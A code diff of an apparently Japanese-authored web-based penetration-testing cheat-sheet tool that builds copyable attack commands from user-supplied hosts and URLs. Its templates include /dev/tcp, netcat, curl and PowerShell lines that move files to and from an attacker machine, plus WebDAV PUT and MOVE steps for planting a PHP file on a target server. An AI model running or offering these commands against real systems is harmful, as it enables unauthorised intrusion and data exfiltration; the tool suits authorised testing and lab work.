@@ -50,17 +50,14 @@ $(function () {
   // --- Setup web application penetration test list ---
   STORAGE_KEY = 'WEB_ENV';
   storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
-  const reconRhost = (storageInfo && storageInfo.RHOST) || '10.0.0.1';
-  const reconLport = (storageInfo && storageInfo.RPORT) || '4444';
-  const recon = new Recon('#mytoolRecon', ['#reconNmapList', '#reconLDAPList'], {
-    'RHOST': '#reconInputRHOST',
-    'RPORT': '#reconInputRPORT',
-    'SUBMIT': '#reconInputSubmit',
+  const webURL = (storageInfo && storageInfo.URL) || 'http://10.0.0.1/';
+  const web = new Web('#mytoolWeb', ['#webList'], {
+    'URL': '#webInputURL',
+    'SUBMIT': '#webInputSubmit',
   })
-  recon.STORAGE_KEY = STORAGE_KEY;
-  recon.setup(reconRhost, reconLport);
-  recon.draw(reconRhost, reconLport);
-
+  web.STORAGE_KEY = STORAGE_KEY;
+  web.setup(webURL);
+  web.draw(webURL);
 
   // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
   const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
@@ -203,20 +200,6 @@ class MyTool {
   }
 }
 
-class Web extends MyTool {
-  constructor(...args) {
-    super(...args);
-
-    this.targetContents['1'] = [
-      {'title': '', 'cmd': 'davtest -url "{0}"'},
-    ]
-  }
-
-  drawList(index, targetContent, url) {
-    //
-  }
-}
-
 // ---- Reverse Shell ----------------------------------------------------------
 class RevShell extends MyTool {
   constructor(...args) {
@@ -328,8 +311,8 @@ class UpDown extends MyTool {
     // LHOST: {0}, LPORT: {1}, FILE: {2}
     this.targetContents[0] = [
       {'title': '1. @Kali (bash)', 'cmd': 'nc -lnvp {1} < {2}'},
-      {'title': '1. cat', 'cmd': 'cat < /dev/tcp/{0}/{1} > {2}'},
-      {'title': '2. @Kali (curl, wget)', 'cmd': 'python3 -m http.server {1}'},
+      {'title': '2. cat', 'cmd': 'cat < /dev/tcp/{0}/{1} > {2}'},
+      {'title': '1. @Kali (curl, wget)', 'cmd': 'python3 -m http.server {1}'},
       {'title': '2. wget', 'cmd': 'wget {0}:{1}/{2}'},
       {'title': '2. curl', 'cmd': 'curl {0}:{1}/{2} -O'},
       {'title': '2. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).DownloadFile('http://{0}:{1}/{2}', '{2}')"`},
@@ -340,20 +323,20 @@ class UpDown extends MyTool {
     // LHOST: {0}, LPORT: {1}, FILE: {2}
     this.targetContents[1] = [
       {'title': '1. @Kali (bash)', 'cmd': 'nc -lvnp {1} > {2}'},
-      {'title': '1. bash', 'cmd': 'cat {2} > /dev/tcp/{0}/{1}'},
-      {'title': '2. @Kali (curl)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py'},
+      {'title': '2. bash', 'cmd': 'cat {2} > /dev/tcp/{0}/{1}'},
+      {'title': '1. @Kali (curl)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py'},
       {'title': '2. @Kali (curl)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
-      {'title': '2. curl', 'cmd': 'curl {0}:{1} -X POST -F file=@{2}'},
-      {'title': '3. @Kali (powershell)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
-      {'title': '3. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).UploadFile('http://{0}:{1}','{2}')"`},
+      {'title': '3. curl', 'cmd': 'curl {0}:{1} -X POST -F file=@{2}'},
+      {'title': '1. @Kali (powershell)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
+      {'title': '2. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).UploadFile('http://{0}:{1}','{2}')"`},
     ];
   }
 
   drawList(index, targetContent, lhost, lport, filename) {
     for (let i = 0; i < targetContent.length; i++) {
-      const uploadCmd = targetContent[i];
-      let title = uploadCmd.title;
-      let cmd = uploadCmd.cmd;
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
       cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
       cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
       cmd = cmd.replaceAll('{2}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
@@ -393,9 +376,9 @@ class Recon extends MyTool {
 
   drawList(index, targetContent, rhost, rport) {
     for (let i = 0; i < targetContent.length; i++) {
-      const uploadCmd = targetContent[i];
-      let title = uploadCmd.title;
-      let cmd = uploadCmd.cmd;
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
       cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
       cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(rport)}</span>`);
       // Template
@@ -411,6 +394,43 @@ class Recon extends MyTool {
     }
   }
 }
+
+// ---- Web Application Penetration Test ---------------------------------------
+class Web extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1'] = [
+      {'title': 'gobuster', 'cmd': 'gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "{0}"'},
+      {'title': 'nikto', 'cmd': 'nikto --url "{0}"'},
+      {'title': 'WebDAV', 'cmd': 'davtest -url "{0}"'},
+      {'title': 'WebDAV', 'cmd': `curl -v -X PUT '{0}/UPLOADFILE.php' -d @UPLOADFILE.php`},
+      {'title': '1. PUT txt file', 'cmd': `curl -v -X PUT '{0}/UPLOADFILE.txt' --data-binary @UPLOADFILE.php`},
+      {'title': '2. MOVE from txt to php', 'cmd': `curl -v -X MOVE '{0}/UPLOADFILE.txt' --header 'Destination: {0}/UPLOADFILE.php'`},
+    ]
+  }
+
+  drawList(index, targetContent, url) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
+      cmd = cmd.replaceAll('{0}', `<span class="bg-warning">${htmlEscape(url)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
+
+
 
 
 function htmlEscape(str) {
